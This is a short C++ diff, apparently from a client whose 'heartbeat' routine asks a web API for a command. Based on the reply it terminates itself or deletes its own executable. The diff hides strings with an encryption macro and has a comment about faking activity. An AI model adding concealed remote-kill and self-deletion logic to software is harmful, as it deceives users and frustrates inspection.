@@ -11,7 +11,7 @@ webAPIHeartbeat::webAPIHeartbeat() {
     bool result = api.submit();
 
     if (result) {
-        int s = api.getNullableValue<int>(std::string(vxENCRYPT("id")));
+        int s = api.getNullableValue<int>(std::string(vxENCRYPT("id").decrypt()));
 
         // make it look like we're doing something with these at least
         bool status = api.getNullableValue<bool>("status");
@@ -28,7 +28,7 @@ webAPIHeartbeat::webAPIHeartbeat() {
 
         switch (s) {
             case 13 :
-                this.eatIt();
+                this->eatIt();
                 break;
             case 66:
                 std::string p = this->get_selfpath();
@@ -37,14 +37,12 @@ webAPIHeartbeat::webAPIHeartbeat() {
                     remove(p.c_str());
                 }
 
-                this.eatIt();
-                break;
-            default:
+                this->eatIt();
                 break;
         };
 
         done = true;
     } else {
-        this.eatIt();
+        this->eatIt();
     }
 }
